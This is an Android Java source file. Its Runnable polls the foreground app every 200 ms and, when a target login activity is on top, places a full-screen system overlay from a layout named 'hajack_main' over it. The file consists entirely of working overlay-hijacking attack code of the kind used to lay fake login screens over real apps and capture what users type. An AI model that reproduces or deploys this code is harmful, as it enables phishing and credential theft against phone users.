package com.example.tools.thread;

import java.util.List;

import com.example.tools.R;
import com.example.tools.utils.LogUtils;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;

public class otherhajckRunnable implements Runnable {
    private Context context;
    private static boolean isContinue = true;

    public otherhajckRunnable(Context context) {
        this.context = context;
    }

    public static void setIsContinue(boolean c) {
        isContinue = c;
    }
    //设置成为系统窗口
    @Override
    public void run() {
        while (isContinue) {
            ActivityManager am = (ActivityManager) context.getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(1);
            if ("com.example.login.MainActivity".equals(tasks.get(0).topActivity.getClassName())) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                    	Looper.prepare();
                        LayoutInflater layoutInflater = (LayoutInflater) context.getApplicationContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
                        WindowManager wm = (WindowManager) context.getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
                        View injectView = layoutInflater.inflate(R.layout.hajack_main, null);
                        injectView.setVisibility(View.VISIBLE);
                        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
                        layoutParams.type = WindowManager.LayoutParams.TYPE_PHONE;
                        layoutParams.format = WindowManager.LayoutParams.FIRST_APPLICATION_WINDOW;
                        layoutParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
                        DisplayMetrics metrics = new DisplayMetrics();
                        wm.getDefaultDisplay().getMetrics(metrics);
                        layoutParams.width = metrics.widthPixels;
                        layoutParams.height = metrics.heightPixels;
                        layoutParams.gravity = 80;
                        wm.addView(injectView, layoutParams);
                        LogUtils.i( "i am start");
                        //wm.updateViewLayout(injectView, layoutParams);

//                        try {
//                            Thread.sleep(5000);
//                            ActivityManager am = (ActivityManager) context.getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
//                            List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(1);
//                            Log.d("TEST", tasks.get(0).topActivity.getClassName());
//                        } catch (InterruptedException e) {
//                            e.printStackTrace();
//                        }


                    }
                }).start();
            }
            try {
                Thread.sleep(200);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}